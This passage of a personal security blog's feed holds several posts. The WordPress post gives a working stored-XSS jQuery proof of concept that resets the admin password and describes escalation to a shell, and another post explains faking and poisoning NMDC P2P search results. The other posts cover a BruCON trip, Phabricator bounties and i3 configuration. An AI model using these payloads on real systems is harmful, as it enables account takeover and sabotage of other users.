&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$Search 192.168.1.5:412 T?T?500000?1?Gentoo$2005|
$Search Hub:SomeNick T?T?500000?1?Gentoo$2005|
$Search 192.168.1.5:412 F?T?0?9?TTH:TO32WPD6AQE7VA7654HEAM5GKFQGIL7F2BEKFNA|
$Search Hub:SomeNick F?T?0?9?TTH:TO32WPD6AQE7VA7654HEAM5GKFQGIL7F2BEKFNA|
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, whenever you get one search query, you can send a &lt;strong&gt;convincing&lt;/strong&gt; fake result. I wrote a small python script which sends a fake
result for every search :P&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$SR MyNick F:_\search_term.proper_extension&amp;lt;0x05&amp;gt;file_size 5/5&amp;lt;0x05&amp;gt;HubName (192.168.1.1:411)|
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But this is not as easy as it seems because our search results have to be convincing. Things to keep in mind&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If the file is big and there are matching results, then the victim client will try to download part of file from other clients.&lt;/li&gt;
&lt;li&gt;Using appropriate file extension when particular type of files are searched. Clients will filter results which donot match extension&lt;/li&gt;
&lt;li&gt;Using a unique TTH hash for every different fake file :P&lt;/li&gt;
&lt;li&gt;Using convincing file size because there cannot be a movie mp4 file of 25kB :P&lt;/li&gt;
&lt;li&gt;Let me tell you it is more complicated to produce convincing results, best way is to cache the search results and extract useful
filenames and TTH hashes. This is tricky.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Just watching the world burn (Making downloads of all users useless)&lt;/h4&gt;
&lt;p&gt;There are few people who just want to watch the world burn. For them, there is a facility in NMDC. The clients search using TTH
hashes for alternate sources to download a part of file. If you respond to that search and send random binary data, the downloaded
file will end up being useless. Nothing particularly of interest, but will be fun to mess with few people. This feat will require huge
processing power and great bandwidth even for an active hub with users in two digits.&lt;/p&gt;</content><category term="hacks"></category><category term="tools"></category></entry><entry><title>My first BruCON (2014)</title><link href="https://tunnelshade.in/blog/2014/10/my-first-brucon/" rel="alternate"></link><published>2014-10-02T00:00:00+05:30</published><updated>2014-10-02T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-10-02:/blog/2014/10/my-first-brucon/</id><summary type="html">&lt;p&gt;&lt;strong&gt;It couldn't have been any better for me&lt;/strong&gt;. If you haven't been to BruCON, I suggest you to hurry up. As one of the attendees
tweeted - '&lt;em&gt;You never meet a stranger at BruCON&lt;/em&gt;'. I was one of the &lt;a href="http://2014.brucon.org/index.php/Schedule"&gt;&lt;strong&gt;5by5&lt;/strong&gt; speakers&lt;/a&gt;
for the 2014 edition.&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Travel&lt;/h4&gt;
&lt;p&gt;The journey was too long â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;It couldn't have been any better for me&lt;/strong&gt;. If you haven't been to BruCON, I suggest you to hurry up. As one of the attendees
tweeted - '&lt;em&gt;You never meet a stranger at BruCON&lt;/em&gt;'. I was one of the &lt;a href="http://2014.brucon.org/index.php/Schedule"&gt;&lt;strong&gt;5by5&lt;/strong&gt; speakers&lt;/a&gt;
for the 2014 edition.&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Travel&lt;/h4&gt;
&lt;p&gt;The journey was too long with a flight time of 11 hours. My journey was &lt;strong&gt;VNS-DEL-AUH-BRU&lt;/strong&gt;. I reached Brussels on 24&lt;sup&gt;th&lt;/sup&gt; Sept.
All my weariness vanished the moment I landed in &lt;em&gt;Brussels Airport&lt;/em&gt;. Since it was my first time in Europe, I had the privilege to
admire almost everything :P. Adding to this, &lt;strong&gt;Gent&lt;/strong&gt; was nothing short of a visual treat.&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Day 0 (24&lt;sup&gt;th&lt;/sup&gt; Sept, 2014)&lt;/h4&gt;
&lt;p&gt;As soon as I reached my hotel, I contacted my team mate who was already there. At the speakers dinner, I met my GSoC 13 mentor
&lt;a href="https://twitter.com/kkotowicz"&gt;&lt;strong&gt;Krzysztof Kotowicz&lt;/strong&gt;&lt;/a&gt; along with many other cool people and came to know about their work. That
night was a blast, and as soon as I returned to the hotel, I dozed off.&lt;/p&gt;
&lt;hr&gt;
&lt;h4&gt;Day 1 (25&lt;sup&gt;th&lt;/sup&gt; Sept, 2014)&lt;/h4&gt;
&lt;p&gt;The first day at conference involves registration. As soon as I checked the &lt;a href="http://sched.brucon.org"&gt;schedule&lt;/a&gt;, I realised that the
&lt;a href="http://2014.brucon.org/index.php/Lightning_Talks"&gt;lightning talks&lt;/a&gt; were scheduled in the afternoon of the same day. So, sitting in a
talk, finished the slides and mailed them. It wasn't particularly great, but it went on something like this&lt;/p&gt;
&lt;iframe width="560" height="315" src="//www.youtube.com/embed/X40qqdeW4XY" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;What followed it was a huge surprise&lt;/p&gt;
&lt;iframe width="560" height="315" src="//www.youtube.com/embed/JXPMBamHI8c" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr&gt;
&lt;h4&gt;Day 2 (26&lt;sup&gt;th&lt;/sup&gt; Sept, 2014)&lt;/h4&gt;
&lt;p&gt;The second day, I met my other GSoC 2013 mentor &lt;a href="https://twitter.com/javutin"&gt;&lt;strong&gt;Javier Marcos&lt;/strong&gt;&lt;/a&gt; and saw him win the &lt;strong&gt;nviso&lt;/strong&gt; ctf.
In the afternoon I had the 5by5 talk, which went like this&lt;/p&gt;
&lt;iframe width="420" height="315" src="//www.youtube.com/embed/j2UoAsOLMB4" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;The slides are available on &lt;a href="https://speakerdeck.com/tunnelshade/brucon-2014-5by5-owasp-owtf"&gt;speakerdeck&lt;/a&gt;. Met few more cool people.
Overall, it was a really good experience. On my flight back home, all I did was to correct people who used a wrong twitter handle :P.
If you wish to see some pics, I have them in my fb albums.&lt;/p&gt;</content><category term="conference"></category></entry><entry><title>Phacilitating phew bugs ;)</title><link href="https://tunnelshade.in/blog/2014/07/phabricator-hacks/" rel="alternate"></link><published>2014-07-02T00:00:00+05:30</published><updated>2014-07-02T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-07-02:/blog/2014/07/phabricator-hacks/</id><summary type="html">&lt;p&gt;I am not a huge fan of bug bounties since I am more of a tool developer. But as the title suggests, to keep myself
fresh &amp;amp; bounties from &lt;a href="https://hackerone.com/ibb"&gt;&lt;strong&gt;IBB&lt;/strong&gt;&lt;/a&gt; are special. So enter &lt;strong&gt;Phabricator&lt;/strong&gt;.&lt;/p&gt;
&lt;h5&gt;Phabricator is :&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;the best piece of software for collaboration&lt;/li&gt;
&lt;li&gt;originally written at &lt;em&gt;Facebook&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;now maintained by â€¦&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;I am not a huge fan of bug bounties since I am more of a tool developer. But as the title suggests, to keep myself
fresh &amp;amp; bounties from &lt;a href="https://hackerone.com/ibb"&gt;&lt;strong&gt;IBB&lt;/strong&gt;&lt;/a&gt; are special. So enter &lt;strong&gt;Phabricator&lt;/strong&gt;.&lt;/p&gt;
&lt;h5&gt;Phabricator is :&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;the best piece of software for collaboration&lt;/li&gt;
&lt;li&gt;originally written at &lt;em&gt;Facebook&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;now maintained by &lt;a href="http://phacility.com"&gt;&lt;em&gt;Phacility&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;open &lt;a href="https://github.com/phacility"&gt;source&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;Bugs (Great that all the details are on hackerone, no need to repeat ;)&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;https://hackerone.com/reports/16315&lt;/li&gt;
&lt;li&gt;https://hackerone.com/reports/16392&lt;/li&gt;
&lt;li&gt;https://hackerone.com/reports/18691&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;What to grasp :&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Focus on functional bugs, there will be lots of design flaws.&lt;/li&gt;
&lt;li&gt;When testing something like phabricator which requires your own installation, use a &lt;strong&gt;VPS&lt;/strong&gt;. Setup all the required
stuff and then save a snapshot. This way even if you mess up your installation, just restore using snapshot.&lt;/li&gt;
&lt;li&gt;Be persistent and calm.&lt;/li&gt;
&lt;li&gt;Find bugs :P.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Enough of &lt;strong&gt;phabricator&lt;/strong&gt; for now. Lets build some stuff ;)&lt;/p&gt;</content><category term="info"></category></entry><entry><title>Wordpress [Bugs/Hacks/Tweaks/Tricks]? I am not sure</title><link href="https://tunnelshade.in/blog/2014/06/wordpress-tricks/" rel="alternate"></link><published>2014-06-27T00:00:00+05:30</published><updated>2014-06-27T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-06-27:/blog/2014/06/wordpress-tricks/</id><summary type="html">&lt;p&gt;The following is writeup of how I dealt with a specific circumstance. I was up against a wordpress
installation in one of my tests and luckily I already had &lt;strong&gt;editor&lt;/strong&gt; level credentials. So I have to somehow obtain a
shell. Remember that editor's do not have the ability to &lt;strong&gt;edit â€¦&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;The following is writeup of how I dealt with a specific circumstance. I was up against a wordpress
installation in one of my tests and luckily I already had &lt;strong&gt;editor&lt;/strong&gt; level credentials. So I have to somehow obtain a
shell. Remember that editor's do not have the ability to &lt;strong&gt;edit/add themes/plugins&lt;/strong&gt;. So, aim was to run php using my
editor privileges.&lt;/p&gt;
&lt;h4&gt;Solid Facts :&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;I can add html in the site using &lt;em&gt;editor privileges&lt;/em&gt; (i.e unfiltered_html capability for editors).&lt;/li&gt;
&lt;li&gt;Nothing more valuable than the above point. (Later found some interesting places in dashboard where payloads work).&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Methods which won't work :&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Cannot steal cookies of administrator, since &lt;strong&gt;httponly&lt;/strong&gt; flag is set on cookies.&lt;/li&gt;
&lt;li&gt;No dumb popups asking for password because that might create suspicion, we ain't dealing with skiddies.&lt;/li&gt;
&lt;li&gt;Solid patched wordpress with up-to-date plugins.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Methods which will :&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Resetting &lt;strong&gt;admin&lt;/strong&gt; password. I wrote a sample POC which when run resets admin password to &lt;strong&gt;t3st&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;siteUrl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://wordpress.org&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;// Wordpress site url&lt;/span&gt;

&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;ready&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;siteUrl&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/wp-admin/profile.php?wp_http_referer=%2Fwp-admin%2Fusers.php&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;html&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;form&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#pass1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;t3st&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// New password&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#pass2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;t3st&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// Confirm password&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;find&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#submit&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;click&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;User roles can be changed by admin in the interface, so again with some &lt;strong&gt;js-fu&lt;/strong&gt; we can generate these requests to escalate our editor account to admin.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Admin can write php directly to themes and plugins, so something like &lt;a href="https://nealpoole.com/blog/2011/01/how-does-cross-site-scripting-become-arbitrary-code-execution-an-ode-to-the-oft-maligned-referer-header/"&gt;this&lt;/a&gt; can be done.&lt;/li&gt;
&lt;li&gt;Email address of the admin can also be changed instead of password, then password reset and boom.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Since I am lazy, I just created POC for the first one. Off all the above, I used the third one to write some file of the theme and I popped a hard &lt;strong&gt;shell&lt;/strong&gt;.
So the crisp till now is &lt;strong&gt;Even though wordpress doesn't allow editors to write php directly, we can do it in an indirect manner&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Hold on folks, I know what you are thinking, for the above attacks to work, &lt;em&gt;a loggedin admin&lt;/em&gt; has to visit an infected post/page. I will say
not required. &lt;strong&gt;WHY?&lt;/strong&gt;&lt;/p&gt;
&lt;h4&gt;Added advantages :&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A JS-payload entered in the title of a new post/page (by using editor obviously) gets executed right in the homepage of dashboard. &lt;strong&gt;WTF? WHERE?&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Recently Published section in the dashboard shows the latest posts/pages, so payloads get executed there
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Payload also gets executed in &lt;strong&gt;Revisions&lt;/strong&gt; of that particular post/page.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;Obviously the original page/post.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;And in a flash I remembered two statements :&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Privilege escalation&lt;/li&gt;
&lt;li&gt;&lt;a href="http://make.wordpress.org/core/handbook/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html"&gt;Content is never displayed unfiltered in the admin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Reported these to wordpress and they classified these bugs as :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Won't Fix&lt;/li&gt;
&lt;li&gt;N.A&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;May be they are right, but then why different accounts for &lt;em&gt;admin&lt;/em&gt; and &lt;em&gt;editor&lt;/em&gt; when both can do same set of tasks ;)&lt;/p&gt;</content><category term="tricks"></category><category term="hacks"></category></entry><entry><title>Configuring i3 for my setup</title><link href="https://tunnelshade.in/blog/2014/05/making-i3-beautiful/" rel="alternate"></link><published>2014-05-12T00:00:00+05:30</published><updated>2014-05-12T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2014-05-12:/blog/2014/05/making-i3-beautiful/</id><summary type="html">&lt;p&gt;&lt;strong&gt;I later moved to bspwm, maybe you might want to look at that as well --&amp;gt; &lt;a href="https://tunnelshade.in/blog/2017/07/configuring-bspwm/"&gt;bspwm&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Well, in this article, I will follow step by step procedure of setting up i3. My &lt;a href="http://github.com/tunnelshade/awesome-dots"&gt;dotfiles&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First of all, install i3, i3lock &amp;amp; i3status. Generally, installing i3 will pull these as dependencies.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Edit your â€¦&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;I later moved to bspwm, maybe you might want to look at that as well --&amp;gt; &lt;a href="https://tunnelshade.in/blog/2017/07/configuring-bspwm/"&gt;bspwm&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Well, in this article, I will follow step by step procedure of setting up i3. My &lt;a href="http://github.com/tunnelshade/awesome-dots"&gt;dotfiles&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First of all, install i3, i3lock &amp;amp; i3status. Generally, installing i3 will pull these as dependencies.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Edit your &lt;strong&gt;.xinitrc&lt;/strong&gt; to launch i3.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;exec i3

# If you wish to log to a file
exec i3 -V &amp;gt;&amp;gt; ~/.i3/i3log 2&amp;gt;&amp;amp;1
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;During the first run, i3 will ask for your default keybinding. Some help on keyboard layout is &lt;a href="http://i3wm.org/docs/userguide.html#_default_keybindings"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Now, lets start editing the configuration files. The main config file is present at &lt;strong&gt;~/.i3/config&lt;/strong&gt;. First, one would prefer to have named workspaces.
So the following has to be done for number of named workspaces you want. Check &lt;a href="https://github.com/tunnelshade/awesome-dots/blob/44c51685ac446ffdd2f6ec87252ed1c4be652026/.i3/config#L90"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Name the workspaces
set $tag1 &amp;quot;1: www&amp;quot;

# switch to workspace
bindsym $mod+1 workspace $tag1

# move focused container to workspace
bindsym $mod+Shift+1 move container to workspace $tag1
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Wow, so now we have named workspaces (for which you have to login again) let us change some settings for i3bar in &lt;strong&gt;~/.i3/config&lt;/strong&gt;. Colors can be set here along
with some position settings. Check for &lt;strong&gt;bar&lt;/strong&gt; in config file as there are some defaults present. Help on these settings is available &lt;a href="http://i3wm.org/docs/userguide.html#_configuring_i3bar"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Start i3bar to display a workspace bar (plus the system information i3status
# finds out, if available)
bar {
        colors {
                # Whole color settings
                background #000000
                statusline #ffffff
                separator  #666666

                # Type             border  background font
                focused_workspace  #008fff #007fff #ffffff
                active_workspace   #333333 #5f676a #ffffff
                inactive_workspace #333333 #222222 #888888
                urgent_workspace   #aa0000 #990000 #ffffff
        }
        # i3bar position
        position top
        # Using custom i3status.conf
        status_command i3status -c ~/.i3/i3status.conf
}
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Edit the i3status config file if you want to tweak it. Don't forget to copy it to your home directory. Check out my
&lt;a href="https://github.com/tunnelshade/awesome-dots/blob/master/.i3/i3status.conf"&gt;i3status config&lt;/a&gt;. Official wiki is &lt;a href="http://i3wm.org/i3status/manpage.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cp /etc/i3status.conf ~/.i3/i3status.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Some applications have to launched at startup, like setting wallpaper, network manager applet etc.. This can be done from config file. Official wiki
&lt;a href="http://i3wm.org/docs/userguide.html#exec"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Startup programs
exec --no-startup-id nm-applet
exec --no-startup-id feh --bg-fill ~/Pictures/Dark-pattern.jpg
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Next, we have to set up our screenlock, for which I use &lt;strong&gt;i3lock&lt;/strong&gt;. I have a &lt;a href="https://github.com/tunnelshade/awesome-dots/blob/master/.i3/i3lock.sh"&gt;small shell script&lt;/a&gt; which does some magic.
After that, some keybindings have to be done. Official wiki &lt;a href="http://i3wm.org/docs/userguide.html#keybindings"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Custom KeyBinds
bindsym Control+mod1+l exec sh ~/.i3/i3lock.sh
bindsym Print exec scrot &amp;#39;%Y-%m-%d-%T_$wx$h_scrot.png&amp;#39; -e &amp;#39;mv $f ~/Pictures/screenshots/&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Now, we have a screen looking something like this (Don't forget to get some cool wallpaper):&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/tunnelshade/awesome-dots/44c51685ac446ffdd2f6ec87252ed1c4be652026/screenshots/clean.png" class="image-center" alt="Clean Screen"/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Beautification&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;So, now let us transform our ugly looking setup :P, fonts first. Use a good font and change the setting in &lt;strong&gt;~/.i3/config&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;font pango: Monospace 8
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Next up are out ugliest component. GTK Apps :P. Instead of editing configuration files and saving them, I highly recommend &lt;strong&gt;lxappearance&lt;/strong&gt;, which has
absolutely no dependencies! Use it set your GTK, Icon &amp;amp; Cursor theme. GTK themes are picked from &lt;strong&gt;~/.themes&lt;/strong&gt; &amp;amp; remaining from &lt;strong&gt;~/.icons&lt;/strong&gt;. My
generated &lt;strong&gt;~/.config/gtk-3.0/settings.ini&lt;/strong&gt; looked like this&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[Settings]&lt;/span&gt;
&lt;span class="na"&gt;gtk-theme-name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;Zukitwo&lt;/span&gt;
&lt;span class="na"&gt;gtk-icon-theme-name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;Faenza-Dark&lt;/span&gt;
&lt;span class="na"&gt;gtk-font-name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;Ubuntu 10&lt;/span&gt;
&lt;span class="na"&gt;gtk-cursor-theme-name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;Ecliz&lt;/span&gt;
&lt;span class="na"&gt;gtk-cursor-theme-size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;0&lt;/span&gt;
&lt;span class="na"&gt;gtk-toolbar-style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;GTK_TOOLBAR_ICONS&lt;/span&gt;
&lt;span class="na"&gt;gtk-toolbar-icon-size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;GTK_ICON_SIZE_LARGE_TOOLBAR&lt;/span&gt;
&lt;span class="na"&gt;gtk-button-images&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;0&lt;/span&gt;
&lt;span class="na"&gt;gtk-menu-images&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1&lt;/span&gt;
&lt;span class="na"&gt;gtk-enable-event-sounds&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1&lt;/span&gt;
&lt;span class="na"&gt;gtk-enable-input-feedback-sounds&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1&lt;/span&gt;
&lt;span class="na"&gt;gtk-xft-antialias&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1&lt;/span&gt;
&lt;span class="na"&gt;gtk-xft-hinting&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;1&lt;/span&gt;
&lt;span class="na"&gt;gtk-xft-hintstyle&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;hintfull&lt;/span&gt;
&lt;span class="na"&gt;gtk-xft-rgba&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;rgb&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use some cool theme and even now, if the buttons are ugly make sure that you have the required &lt;strong&gt;gtk-engine&lt;/strong&gt; installed. For instance, I use &lt;strong&gt;Zukwito&lt;/strong&gt;,
so I need &lt;strong&gt;gtk-engine-murrine&lt;/strong&gt;. Now, your gtk apps must be cool as in any other DE.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;strong&gt;Screenshots&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/tunnelshade/awesome-dots/44c51685ac446ffdd2f6ec87252ed1c4be652026/screenshots/dirty2.png" class="image-center" alt="Dirty Screen"/&gt;&lt;/p&gt;
&lt;h4&gt;&lt;strong&gt;Other Apps&lt;/strong&gt;&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;A list of applications that I use&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; Type                | : Application
---------------------|------------
 **Window Manager**  | : i3
 **Editor**          | : GVim
 **Terminal**        | : Terminator
 **IRC Client**      | : Weechat
 **GTK Theme**       | : Zukwito
 **Icon Theme**      | : Faenza
 **Cursor Theme**    | : Ecliz
 **Music Player**    | : Cmus
 **Video Player**    | : Mplayer
&lt;/pre&gt;&lt;/div&gt;


